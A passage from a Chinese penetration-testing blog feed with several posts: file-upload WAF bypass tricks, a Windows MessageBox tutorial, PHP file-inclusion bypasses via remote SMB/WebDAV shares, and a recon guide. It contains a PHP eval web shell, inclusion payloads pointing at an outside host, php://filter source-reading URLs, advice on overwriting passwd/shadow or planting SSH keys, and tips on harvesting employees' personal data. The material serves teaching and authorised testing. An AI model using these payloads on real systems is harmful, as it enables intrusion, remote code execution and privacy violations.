title="案例六"></a>案例六</h1><p>一次项目测试中发现了一个上传点，但waf拦截jsp、html等后缀，更改后缀重放数据包会导致reset，如下：<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3831654627.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\25.png" alt="img"></a></p><p>进一步测试发现fileName和fileType参数可控，且当存在两个不同的后缀时，最上层的filename参数优先级为最高，可导致任意文件上传<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2073748874.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\26.png" alt="img"></a></p><p>发现上传成功的jsp文件其回显的type类型为image/png类型<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2634279959.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\27.png" alt="img"></a></p><p>删除最下层filename的Content-Type: image/png，文件上传类型即可被绕过<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3945470191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\28.png" alt="img"></a></p><h1 id="其它场景-amp-总结"><a href="#其它场景-amp-总结" class="headerlink" title="其它场景&amp;总结"></a>其它场景&amp;总结</h1><p>有些时候文件上传成功后端没有返回路径，只回显了一个id号，这时候如果目标存在注入的话，我们可尝试用sqlmap的–search参数或者SQLshell对返回的ID号进行搜索，这样说不定就能找到shell地址了，之前在<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a>也说过，感兴趣的可以去看看；也有文件上传成功却只回显一个文件名的，在前不久的一次攻防就遇到这种情况，后来是用了fuzz找到了完整的shell路径，另外在某些时候，上传文件可以跨目录，那么我们可以通过../进行跨目录上传，运气好的话，或许会在几个../后把shell传到域名的根目录下，如果当前上传文件夹无执行权限，那么跨目录上传shell也是个不错的思路；另外，如果上传目录可控，可上传文件到任意目录的话，在linux场景我们可上传一个ssh秘钥用于远程登录，极端一点的话，可考虑上传passwd、shadow文件覆盖系统用户，但前提是权限要足够大。</p><p>如果不能跨目录，站点又没有注入的话，那么我们可以尝试寻找网站日志文件，例如泛微E-COLOGY日志的日志，像这种日志文件是有规律可循的，可以用burp进行日志爆破，或许在日志文件中能找到shell路径也说不定，如果在日志中没有发现shell地址，那么可进一步观察日志里的文件路径，诸如upload，filepath这类路径，举一反三，可对这些路径fuzz shell地址。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1978765052.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\29.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1078504168.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\30.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2406307994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\31.png" alt="img"></a></p><p>再者就是文件包含和文件读取了，文件读取的话可以通过读取日志和配置文件来发现shell地址，但是成功率太低了，至于文件包含，除了靶场和ctf，实战还没碰过。</p><p>还有一个关于burp的使用技巧，这是真实遇到的，上传shell后没有回显路径，但是通过http history搜索shell的名字发现了完整的shell路径，因为传上去的文件，如图片这类的总归是显示出来的，这时候可以先在web应用到处点点，多加载一些数据包，然后再到http history搜索shell的名字，或许会有惊喜也说不定。</p><p>另外要细心点观察上传数据包，或许改一下字段就可以绕过了，例如crc32这类校验。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/3815842614.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\32.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/43265324.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\33.png" alt="img"></a></p><p>某些时候上传黑名单不严谨，那么我们可用伪后缀进行绕过，其它多的就不说了，大概思路就这样，当绕过限制拿到shell时，总会给我带来乐趣，或许这就是我喜欢渗透的原因。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3011390688.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\34.png" alt="img"></a></p><p>文章来自：m1kh师傅 <a href="https://blog.m1kh.com/">https://blog.m1kh.com/</a> </p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从控制台到窗口程序</title>
    <link href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/"/>
    <url>/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/</url>
    
    <content type="html"><![CDATA[<h2 id="从控制台到窗口程序"><a href="#从控制台到窗口程序" class="headerlink" title="从控制台到窗口程序"></a>从控制台到窗口程序</h2><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/1.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/2.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/3.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/4.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/5.png" alt="1"></p><blockquote><p>如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/6.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/7.png" alt="1"></p><blockquote><p>直接按F1  查看参数配置</p></blockquote><blockquote><p>MessageBox  消息框函数：</p></blockquote><blockquote><p>显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。</p></blockquote><blockquote><p>消息框返回一个整数值，指示用户单击了哪个按钮。</p></blockquote><p><strong>语法：</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">int</span> MessageBox(<br>  <span class="hljs-built_in">HWND</span>    <span class="hljs-built_in">hWnd</span>,<br>  LPCTSTR lpText,<br>  LPCTSTR lpCaption,<br>  UINT    uType<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>hWnd</li></ul><p>类型：<strong>HWND</strong></p><p>要创建的消息框的所有者窗口的句柄。如果此参数为<strong>NULL</strong>，则消息框没有所有者窗口。</p><ul><li>lpText</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>要显示的消息。如果字符串由多行组成，您可以在每行之间使用回车符和/或换行符分隔各行。</p><ul><li>lpCaption</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>对话框标题。如果此参数为<strong>NULL</strong>，则默认标题为<strong>Error</strong>。</p><ul><li>uType</li></ul><p>类型：<strong>UINT</strong></p><p>对话框的内容和行为。此参数可以是来自以下标志组的标志的组合。</p><p>要指示消息框中显示的按钮，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/8.png" alt="1"></p><p>要在消息框中显示图标，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/9.png" alt="1"></p><p>其他的可以查文档</p><p><strong>返回值：</strong></p><p>类型：<strong>int</strong></p><p>如果一个消息框有一个<strong>取消</strong>按钮，则该函数返回<strong>IDCANCEL</strong>如果或者ESC键被按下或值<strong>取消</strong>按钮被选择。</p><p>如果消息框没有<strong>取消</strong>按钮，则按 ESC 将不起作用 - 除非存在 MB_OK 按钮。</p><p>如果显示 MB_OK 按钮并且用户按下 ESC，则返回值将为<strong>IDOK</strong>。</p><p>如果函数失败，则返回值为零。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p>如果函数成功，则返回值是以下菜单项值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/10.png" alt="1"></p><blockquote><p>但是这样直接执行是会报错的 因为创建项目的时候 选择的是控制台输出</p></blockquote><blockquote><p>所以需要调整</p></blockquote><blockquote><p>先右键点击项目 点属性</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/11.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/12.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/13.png" alt="1"></p><p>将控制台换成窗口</p><p>成功执行</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/14.png" alt="1"></p><blockquote><p>为什么hello word前面要加L   因为  创建项目的时候 默认是使用的WCHAR类型的字符集  不加L的话 使用的就CHAR类型的   不匹配 就会报错</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/15.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/16.png" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含漏洞（allow_url_include=Off）的绕过方法</title>
    <link href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" alt="1"></p><p>假设服务端的php代码（aaa.php）如下图所示：</p><h2 id="第1种：smb协议"><a href="#第1种：smb协议" class="headerlink" title="第1种：smb协议"></a><strong>第1种：smb协议</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm</a></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" alt="2"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.</p><p>首先在VPS上搭建Samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下图所示：</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" alt="3"></p><p>然后在/home/share目录创建abc1238.htm文件，文件内容为：<font color="red"><?php phpinfo();?></font></p><p>最后启动Samba服务，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第2种：WebDAV"><a href="#第2种：WebDAV" class="headerlink" title="第2种：WebDAV"></a><strong>第2种：WebDAV</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo()">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo()</a>;</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" alt="4"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器。</p><p>首先在VPS上搭建WebDAV环境，我是基于Ubuntu+Apache httpd搭建的WebDAV环境。</p><p>然后在WebDAV目录下创建code.htm文件，文件内容为：<font color="red"><?php eval($_GET['cmd']);?></font></p><p>最后启动Apache httpd服务器，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo();%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo();即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第3种：php-filter"><a href="#第3种：php-filter" class="headerlink" title="第3种：php://filter/"></a><strong>第3种：php://filter/</strong></h2><p>利用php://filter/不能直接GetShell，但可以读取网站php代码文件，然后进行代码分析。或读取网站配置文件等其他重要文件。</p><p>Payload：</p><p><font color="red"><a href="http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php">http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php</a></font></p><p><font color="red"><a href="http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</a></font></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" alt="5"></p><p>执行上述Payload会将D:/phpStudy/WWW/drupal-7.54/index.php文件以base64编码形式返回。</p><p>这种方法在Linux和Windows服务器都可以。</p><p>附带参考链接：</p><p><a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx">https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html">https://www.cnblogs.com/iamstudy/articles/include_file.html</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是渗透最重要的阶段，通过一系列的操作尽可能多的收集到多的目标的各种信息，只有先收集到多的信息之后才有利于后续的渗透。</p><h2 id="信息收集方式"><a href="#信息收集方式" class="headerlink" title="信息收集方式"></a>信息收集方式</h2><h3 id="主动收集："><a href="#主动收集：" class="headerlink" title="主动收集："></a>主动收集：</h3><p>与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息</p><h3 id="被动收集："><a href="#被动收集：" class="headerlink" title="被动收集："></a>被动收集：</h3><p>不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息</p><h2 id="一、收集域名信息"><a href="#一、收集域名信息" class="headerlink" title="一、收集域名信息"></a>一、收集域名信息</h2><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括<br>域名 DNS 务器信息和注册人的联系信息等。<br><strong>域名信息收集</strong>的常用方法有以下这几种：</p><h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><ul><li>用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</li><li>Whois查询我们主要关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。</li><li>whois信息在线收集地址<br>站长之家： <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>阿里云域名信息查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li>whois反查<br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>whois反查可根据whois获取到的域名所有人、域名注册商、域名注册日期和过期日期等,使用邮箱，电话等进行反查获取更多关联的域名等信息</li></ul><h3 id="2-备案信息查询"><a href="#2-备案信息查询" class="headerlink" title="2.备案信息查询"></a>2.备案信息查询</h3><ul><li>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</li><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>爱站网：<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></li></ul><h3 id="3-企业信息查询"><a href="#3-企业信息查询" class="headerlink" title="3.企业信息查询"></a>3.企业信息查询</h3><ul><li>1.企业基本信息。</li></ul><p>2.员工信息（手机号码、邮箱、姓名等），组织框架、企业法人、企业综合信息等。<br>3.其中员工信息收集是信息收集中的一项重要工作，员工信息包括：员工姓名、员工工号、员工家庭及交际信息、上网习惯等。（社会工程学）<br>4.员工身份信息：员工简历，员工身份证，手机号，生日，家乡，住址等个人信息。5、员工社交账号信息：QQ号，QQ群，微博，微信，支付宝，员工邮箱账号等。</p><ul><li><p>可以通过天眼查等等网站 查找测试目标的身份信息  邮箱等<br>如果查到邮箱之后  <strong>在对方允许的情况下</strong> 就可以进行钓鱼测试<br>可以通过一些HR入手 在各大招聘网收集相关信息</p></li><li><p><em>用到的东西：</em>*</p><ul><li><a href="https://www.tianyancha.com天眼查/">https://www.tianyancha.com天眼查</a><br><a href="https://www.qichacha.com/%E4%BC%81%E6%9F%A5%E6%9F%A5">https://www.qichacha.com/企查查</a><br><a href="https://www.reg007.com/">https://www.reg007.com/</a>  注册过哪些网站<br><a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a> 在线邮箱查询<br>Maltego 信息收集<br>各种招聘网<br><a href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 在线汉字转拼音<br><a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a> 超级弱口令工具<br><a href="https://anonymousemail.me/">https://anonymousemail.me/</a> 匿名邮箱</li></ul></li><li><p>通过kali里面的Maltego对测试站点的信息收集</p><h3 id="4-JS信息收集"><a href="#4-JS信息收集" class="headerlink" title="4.JS信息收集"></a>4.JS信息收集</h3></li><li><p>通过JS收集，url，目录和参数<br>Js作为我们信息收集里面重要的一个环节很多人会忽略，Js里面可能蕴藏了很多敏感信息，组成字典fuzz效果很好。<br>用到的脚本：<br><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><h2 id="二、子域名收集"><a href="#二、子域名收集" class="headerlink" title="二、子域名收集"></a>二、子域名收集</h2><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h3 id="1-工具收集"><a href="#1-工具收集" class="headerlink" title="1.工具收集"></a>1.工具收集</h3><p>layer子域名挖掘机、subDomainsBrute、K8、orangescan、DNSRecon、Sublist3r、dnsmaper、wydomain等等。此类工具github都有下载地址和使用方法。</p></li><li><p>*SubDomainBrute**：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p>*Sublist3r**：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q  </a>密码:aup5</p></li></ul><h3 id="2-搜索引擎"><a href="#2-搜索引擎" class="headerlink" title="2.搜索引擎"></a>2.搜索引擎</h3><h4 id="1-google-hack语法"><a href="#1-google-hack语法" class="headerlink" title="1.google hack语法"></a>1.google hack语法</h4><ul><li>  site 指定域名<br>  intext   正文中存在关键字的网页<br>  intitle   标题中存在关键字的网页<br>  info      一些基本信息<br>  inurl    URL存在关键字的网页<br>  filetype 搜索指定文件类型    * 1、​site:baidu.com#收集百度子域名    * 2、intitle:管理登录  #查找后台管理登陆界面    * 3.filetype:php   #查找php类型主页    * 4、inurl:file   #查找url上含file的网址寻找上传漏洞​    * other<pre><code>  site:xx.com filetype:txt 查找TXT文件 其他的以此类推  查找后台  site:xx.com intext:管理  site:xx.com inurl:login  site:xx.com intitle:后台  查看服务器使用的程序  site:xx.com filetype:asp  site:xx.com filetype:php  site:xx.com filetype:jsp  site:xx.com filetype:aspx  查看上传漏洞  site:xx.com inurl:file  site:xx.com inurl:load  查找注射点  site:xx.com filetype:asp</code></pre><h4 id="2-网络组件搜索引擎"><a href="#2-网络组件搜索引擎" class="headerlink" title="2.网络组件搜索引擎"></a>2.网络组件搜索引擎</h4>如shodanhq.com、zoomeye.org、<a href="http://www.fofa.so/">www.fofa.so</a><h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4></li><li><em>第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</em>*<br>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> <h2 id="三、收集敏感信息"><a href="#三、收集敏感信息" class="headerlink" title="三、收集敏感信息"></a>三、收集敏感信息</h2></li><li>*讲解**：当某些站点无法直接通过技术层面进行渗透时，或者无法通过扫描进行信息收集时。这时候可利用搜索引擎搜索目标站点暴露在互联网上的关联信息。例如：数据库文件、sql注入、服务器配置信息、甚至是通过git找到站点泄露源代码、robots.txt等敏感信息。从而达到渗透测试目的。<h3 id="1-github敏感信息泄露"><a href="#1-github敏感信息泄露" class="headerlink" title="1.github敏感信息泄露"></a>1.github敏感信息泄露</h3>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。<br>详细语法请参考一下链接<br><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a><h3 id="2-通过谷歌语法进行信息收集"><a href="#2-通过谷歌语法进行信息收集" class="headerlink" title="2.通过谷歌语法进行信息收集"></a>2.通过谷歌语法进行信息收集</h3>googlehack是指使用google等搜索引擎对某些特定的网络主机暴露在公网上的信息进行搜索，已达到快速搜集相关敏感信息并进行利用的目的。<h3 id="3-工具主动扫描"><a href="#3-工具主动扫描" class="headerlink" title="3.工具主动扫描"></a>3.工具主动扫描</h3><h4 id="敏感目录文件"><a href="#敏感目录文件" class="headerlink" title="敏感目录文件"></a>敏感目录文件</h4></li><li>*讲解**：在渗透信息收集攻击中，收集敏感目录文件是非常关键的一步，可以帮助攻击者识别网站存在多少个目录，多少个页面，探索出网站的整体结构。还可以发现网站暴露在互联网的敏感文件、后台文件、数据库文件等</li><li>Google语法是万能的<br>DirBuster（kali自带的一款扫描工具）<br>Webdirscan（python编写的简易的扫描工具）<br>御剑（操作简易方便）<br>dirmap（一款高级web目录扫描工具，功能比较强大）<br>7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a><br>爬虫（AWVS、Burpsuite、北极熊等）</li></ul><p>这些工具都自带字典，也可以自己手动添加，拥有强大的字典也是很关键的</p><h2 id="四、指纹识别"><a href="#四、指纹识别" class="headerlink" title="四、指纹识别"></a>四、指纹识别</h2><p><strong>讲解</strong>：指纹包含网站cms指纹、主机操作系统指纹、web容器指纹等。应用程序一般在html、jss、css等网站文件中包含一些特征码，另外http响应头中往往也会包含一些特征如x-powered-by、cookies等，这些特征码就是指纹信息的重要组成部分。</p><p>在web渗透过程中，对目标网站的指纹识别非常关键，通过工具扫描或者人工测试来识别cms系统是自建还是二次开发，还是直接使用公开的cms程序。通过获取的这些信息来决定后续渗透的思路和策略。指纹识别是黑客攻击环节中一个非常重要的阶段，也是是信息收集中的一个关键环节。<br><strong>方式</strong>：</p><ul><li>1、通过指定特殊目录或者特殊文件<br>  2、底部信息@pwoered by<br>  3、html中注释掉的内容<br>  4、robots.txt文件中的关键字<br>  5、火狐wappalyzer插件<br>  6、whatweb工具<br>  7、潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net</a><br>  8、CMS识别工具 <a href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a><br>  CMS漏洞利用：确定了cms版本后，这里可以通过百度搜索相应漏洞<h2 id="五、Waf识别"><a href="#五、Waf识别" class="headerlink" title="五、Waf识别"></a>五、Waf识别</h2>Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li><li><em>方式：</em>*</li><li>手工 提交恶意数据</li><li>工具（WAFW00F<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f  </a>、Nmap）</li></ul><p>1.Nmap探测WAF有两种脚本。<br>一种是http-waf-detect。</p><blockquote><p>命令：nmap  -p80,443  –script=http-waf-detect  ip</p></blockquote><pre><code>一种是http-waf-fingerprint。&gt;命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h2 id="六、旁站、C段"><a href="#六、旁站、C段" class="headerlink" title="六、旁站、C段"></a>六、旁站、C段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C端：是和目标服务器ip处在同一个C段的其它服务器。<br>旁站和C段的查询方式：</p><ul><li>(1）利用Bing.com，语法为：<a href="http://cn.bing.com/search?q=ip:111.111.111.111">http://cn.bing.com/search?q=ip:111.111.111.111</a><br>  （2）站长之家：<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a><br>  （3）利用Google，语法：site:125.125.125.<br>  （4）利用Nmap，语法：nmap  -p  80,8080  –open  ip/24<br>  （5）K8工具、御剑、北极熊扫描器等<br>  （6）在线：<a href="http://www.webscan.cc/">http://www.webscan.cc/</a> <h2 id="七、真实ip"><a href="#七、真实ip" class="headerlink" 